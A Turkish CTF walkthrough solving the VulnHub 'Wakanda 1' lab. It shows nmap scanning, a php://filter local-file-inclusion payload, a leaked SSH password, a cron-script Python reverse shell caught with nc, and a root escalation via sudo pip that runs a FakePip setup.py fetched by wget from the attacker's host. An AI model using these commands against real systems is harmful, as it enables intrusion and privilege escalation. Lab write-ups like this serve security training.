## Wakanda-1-YolHaritasi
Çözdüğüm ctf'leri unutmamak amacıyla buraya adımlar şeklinde not alıyorum. Bu ctf'i [*vulnhubdan*](https://www.vulnhub.com/entry/wakanda-1,251/) bilgisayarınıza indirip virtualbox'ınıza kurabilirsiniz. Bu ctf'de elde ettiğimiz önemli bilgileri not.txt dosyasına kaydedeceğiz. Virtualbox'a kurduktan sonra makineyi başlatarak ctf'i çözmeye başlayabiliriz.
### *Adım 1:*
İlk olarak tüm ctf'lerde olduğu gibi zafiyetli makinenin açık portlarına bakarak işe başlamayı düşünebiliriz. Lakin nmap taraması yapmak için bir ip adresine ihtiyacımız var. Zafiyetli makine ile aynı ağda olduğumuz için `netdiscover -r 10.0.2.0/24` çalıştırarak ağımızdaki ip'leri aşağıdaki gibi elde edebiliriz.

![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/netdiscover.png)

Eğer bağlantı arayüzünüz eth0 değilde wlan0 ise netdiscover komutunun aralığını (range) ona göre ayarlamanız gerekir.
Zafiyetli makinenin ip'sini yukarıdaki gibi elde ettikten sonra `nmap -v -sS -A -T4 <Hedef IP>` komutunu çalıştrarak açık portları görüntüleyebiliriz.

![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/nmap.png)

Açık portlara baktığımızda ilk dikkatimizi çeken şey 80 portu olyor. Bir sonraki adımda bu websiteyi mutlaka ziyaret etmemiz gerekir. Burada 3333 portunda ssh açık olduğunu görebiliyoruz. Eğer 80 portunda bir şey çıkmazsa makineye ssh kullanarak varsayılan şifre ve kullanıcılar bağlanmaya çalışabiliriz. 111 portunda da başka bir hizmetin açık olduğunu görüyoruz ama bunu araştırmadan önce 2. adıma geçelim ve web zafiyeti olup olmadığına bakalım.
### *Adım 2:*
Siteye girdiğimizde bizi basit bir ekran karşılıyor. Bu ekranda dikkatimizi çeken ilk şey en altta bulunan mamadou kullanıcı ismi oluyor. Bu isme muhtemelen ssh bağlantısı sırasında ihtiyacımız olacaktır. O yüzden not dosyamıza bunu not ediyoruz.

![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/username.png)

Bu site için gobuster komutunu ve dirb'ü ayrı ayrı çalıştırabiliriz nitekim ben çalıştırdım ve kayda değer bir sonuç alamadım. Belki sayfa kaynağında bir şey buluruz 
ümidiyle bakıyoruz. HTML dökümanını incelediğimde bir yorum satırı dikkatimi çekti burada bir link yönlendirmesi bulunuyor:

`<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->`

Burada ?lang=fr kısmını site linkinin sonuna eklediğimizde sitenin fransızca olduğunu görüyoruz. Site adres kısmında daha önce yazılmış bir php dosyası kulanıldığı çıkarımını yapabiliriz. Bu çıkarıma göre linkin ?lang= sonraki kısmından sistem dosyalarına ulaşma denemeleri yapıyoruz fakat sonuç alamıyoruz. Bu denemeleri nasıl yapacağımızı ve denemeler sonuç vermezse neler yapabileceğimizigörmek için * [bu linkten](https://book.hacktricks.xyz/pentesting-web/file-inclusion) *yararlanabiliriz.
Bu sitede yaptığımız okuma sonucu farklı bir index.php dosyasına erişmek ve php filter'ı atlatmak için ?lang= sonrasına sitede yer alan base64 ile ilgili bir link ekliyoruz:

`php://filter/convert.base64-encode/resource=index` 

Sayfa kaynağına giderek base64 ile şifrelenmiş metni alıyoruz ve bir [online decoder](https://www.base64decode.org/) yardımıyla metnideşifre ediyoruz. Ulaştığımız metinde bir şifre kısmı görüyoruz. Elde ettiğimiz şifreyi not dosyamıza ekliyoruz. Artık bir kullanıcı ismine ve şifreye sahibiz. Bununla beraber ssh portu da açık olduğunu biliyoruz. Kullanıcı adımız mamadou şifremiz 'Niamey4Ever227!!!'. Bağlantı başarılı!!
### * Adım 3: *
ssh ile başarıyla bağlandık ama karşımıza çıkan shell içerisinde linux komutlarını çalıştırdığımızda hata aldığımızı görüyoruz. Hatayı dikkatle incelediğimizde ve farklı denemeler yaptığımızda bunun python hataları olduğunu anlayabiliyoruz.

![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/ssh.png)

Burada python çalıştırabildiğimize göre python ile kabuk oluşturabiliriz. Kabuk için 

`import pty; pty.spawn("/bin/bash")`

komutunu çalıştırıyoruz. Artık başta çalıştırmayı denediğimiz tüm komutları çalıştırabiliriz. flag1.txt'yi aşağıdaki gibi elde ediyoruz.

![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/flag.png)

Bu adımda hemen flag2.txt dosyasının nerede olduğunu öğrnelim:

`locate flag2.txt`

Bu komutu çalıştırdığımızda `/home/devops/flag2.txt` sonucunu elde ediyoruz. cat komutu ile bu dosyayı okumaya çalıştığımızda buna iznimiz olmadığı bilgisini alıyoruz.
Yani bu dosyayı okumak için devops kullanıcısı olmamız gerekiyor. Devops kullanıcısı olmak için çeşitli araçlarla zafiyet araması yapmadn önce * find * komutu ile devops kullanıcısının hangi dosyalarına erişebildiğimize bakmak için şu komutu çalıştıralım.

`find / -username devops`

Bu komutu çalıştırdığımızda uzun bir liste elde ediyoruz ama listenin en başı dikkatimizi çekiyor.

![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/find.png)

Burada bir python dosyası ve test isimli bir metin dosyası olduğunu görüyoruz. Bunları cat ile okuyoruz:

Python dosyası
`open('/tmp/test','w').write('test')`

Test dosyası 
`test`

Bu iki dosyaya bakarak python dosyasının daha önce çalıştırıldığını anlayabiliriz. Bunu bir cron dosyası yardımıyla belirli aralıklarla yaptığı da muhtemel olan diğer çıkarım. Bir sonraki adımda python dosyasını kullanacağız.
### *Adım 4:*
Bu adımda python ile reverse shell oluşturacağız. ls -la ile baktığımızda python dosyasına yazma iznine sahip olduğumuzu görebiliriz. [Reverse shell için](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) sitesinde yer alan python reverse shell kodlarını kullanabiliriz. Bu sitede komut satırı için hazırlanan komutu python debug işlmine uygun hale getirerek dosyaya yazalım. reverse shellde ip kısmına kalimizin ip'sini yazarak dosyayı kaydedelim. Başka bir terminalde netcat çalıştıralım:

`nc -nvlp 1234`

Bir shell elde ettik daha önceden dizini bildiğimiz falg2.txt'yi okuyalım:

![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/flag2.png)

Şimdi sırada root.txt dosyasını bulmak var.
### *Adım 5:*
root.txt dosyasına erişmek için yetki yükseltmesi yapmamız gerektiğini biliyoruz. Yetki yükseltmesi için neler yapabileceğimizi düşünelim. Ama ondan önce yetki yükseltmeden yani şifre girmeden neler yapabileceğimize bakalım. Bunun için `sudo -l` komutunu çalıştırıyoruz. İlginç bir drurumla karşılaşıyoruz: 

`User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip`
    
İnternette yaptığımız kısa bir aramada [bir github reposu buluyoruz](https://github.com/0x00-0x00/FakePip). Burada yine bir reverse shell bulduğumuzu söyleyebiliriz.
Bunu ssh ile bağlandığımız makineye nasıl indirebileceğimiz bulmalıyız. Makinede git komutlarının çalışmadığını deneyerek anlayabiliriz. onun dışında wget komutunun çalışmasında bir sıkıntı olmadığını görüyoruz. Ama inen dosyanın .git uzantılı olması da bizi çıkmaza sokuyor. Bu dosyayı kendi sunucumuz üzerinden wget komutu ile makineye yollamak en doğru çözüm olacağını düşünüyoruz. Bu yüzden ilk olarak repo'yu kendi kalimize klonluyoruz. setup.py dosyası içerisindeki localhost yerine kendi ip adresimizi yazıyoruz dosyayı kaydederek ssh ile atılmaya hazır duruma geliyoruz. (port numarasını da unutmuyoruz 13372) Sonrasında dosyayı var/www/html içerisine atıyoruz `cp setup.py /var/www/html` ve apache sunucumuzu başlatıyoruz `service apache2 start'. Şimdi devops olarak bulunduğumuz makinede aşağıdaki komutu çalıştırabiliriz.

`wget http://10.0.2.14/setup.py`

setup.py dosyamız makineye başarıyla indi buradan sonra yetki yükseltmek çocuk oyuncağı. İlk ola 13372 portunu daha önce yaptığımız gibi dinlemeya başlayacağız. Sonra pip kullanarak setup.py dosyasını çalıştıracağız.

`nc -nvlp 13372`

`sudo /usr/bin/pip install . --upgrade --force-reinstall`

![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/root.png)

Okuduğunuz için Teşekkürler :)
